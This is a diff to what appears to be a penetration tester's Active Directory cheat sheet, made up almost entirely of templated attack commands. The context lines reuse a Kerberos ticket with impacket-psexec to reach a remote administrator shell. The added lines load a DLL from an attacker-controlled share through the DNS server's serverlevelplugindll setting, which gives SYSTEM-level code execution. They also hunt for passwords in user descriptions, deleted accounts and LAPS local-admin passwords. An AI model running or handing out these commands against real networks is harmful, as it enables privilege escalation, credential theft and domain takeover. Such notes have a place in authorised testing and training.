@@ -40,3 +40,20 @@ base64 -d ticket.kirbi.b64 > ticket.kirbi
 impacket-ticketConverter ticket.kirbi ticket.ccache
 KRB5CCNAME=ticket.ccache impacket-psexec {{DOMAIN}}/administrator@{{COMPUTER_NAME}} -k -no-pass
 ```
+
+
+## Getting user groups, properties, other weird stuff
+
+```PowerShell
+whoami /groups 
+cmd /c dnscmd localhost /config /serverlevelplugindll \\{{LHOST}}\share\dns.dll
+sc.exe stop dns # then start 
+
+Get-ADUser -identity {{USERNAME}} -properties *
+Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
+Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName={{USERNAME}}) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
+
+Get-ADUser -Filter "ScriptPath -like '*'" -Properties ScriptPath | Select-Object Name, SamAccountName, ScriptPath
+Get-ADUser -Filter "description -like '*password*' -or description -like '*Welcome*'" -Properties description | Select-Object Name, SAMAccountName, Description | Format-Table -AutoSize
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+```
